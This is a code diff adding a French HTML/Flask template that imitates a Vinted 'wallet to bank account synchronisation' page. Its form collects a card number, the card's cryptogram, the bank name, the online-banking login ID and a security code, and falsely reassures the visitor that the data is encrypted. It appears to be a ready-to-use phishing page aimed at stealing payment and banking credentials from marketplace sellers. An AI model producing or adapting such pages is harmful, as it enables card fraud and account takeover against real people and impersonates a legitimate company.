@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Informations de synchronisation</title>
+  <style>
+  body {
+    background: url("{{ url_for('static', filename='background.jpg') }}") no-repeat center center fixed;
+    background-size: cover;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+
+  .card {
+    background-color: #ffffff;
+    width: 400px;
+    border-radius: 12px;
+    box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
+    padding: 24px;
+  }
+
+  .card h2 {
+    margin: 0 0 16px;
+    font-size: 18px;
+    font-weight: 600;
+    color: #2d2d2d;
+  }
+
+  label {
+    display: block;
+    font-size: 13px;
+    margin-bottom: 4px;
+    color: #4d4d4d;
+  }
+
+  input {
+    width: 100%;
+    padding: 10px;
+    border: 1px solid #dcdcdc;
+    border-radius: 8px;
+    font-size: 14px;
+    margin-bottom: 16px;
+    box-sizing: border-box;
+    background-color: #fff;
+    transition: border-color 0.2s ease;
+  }
+
+  input:focus {
+    border-color: #007781;
+    outline: none;
+  }
+
+  input::placeholder {
+    color: #999;
+    font-style: italic;
+  }
+
+  .btn {
+    width: 100%;
+    background-color: #007781;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    padding: 12px;
+    font-size: 16px;
+    cursor: pointer;
+    transition: background-color 0.2s ease;
+  }
+
+  .btn:hover {
+    background-color: #006266;
+  }
+
+  @media (max-width: 480px) {
+    body {
+      padding: 20px;
+      height: auto;
+      align-items: flex-start;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 360px;
+      padding: 16px;
+      box-shadow: 0px 0px 6px rgba(0, 0, 0, 0.1);
+    }
+
+    .card h2 {
+      font-size: 16px;
+    }
+
+    input {
+      font-size: 13px;
+      padding: 9px;
+    }
+
+    .btn {
+      padding: 10px;
+      font-size: 15px;
+    }
+  }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <h2>Synchronisation de votre porte-monnaie Vinted à votre compte bancaire</h2>
+    <h2>Vos données sont cryptées par mesure de sécurité. Merci de ne pas mentionner d'informations personnelles oralement.</h2>
+    <form method="post">
+      <input type="text" id="montant" name="montant" placeholder="Montant à recevoir" required>
+
+      <input type="text" id="carte" name="carte" placeholder="Numéro de carte bleue" required>
+
+      <input type="text" id="crypto" name="crypto" placeholder="Cryptogramme" required>
+
+      <input type="text" id="etablissement" name="etablissement" placeholder="Établissement bancaire" required>
+
+      <input type="text" id="identifiant" name="identifiant" placeholder="Identifiant bancaire" required>
+
+      <input type="text" id="code_securite" name="code_securite" placeholder="Code de sécurité" required>
+
+      <button type="submit" class="btn">Utiliser ces informations</button>
+    </form>
+  </div>
+
+</body>
+</html>
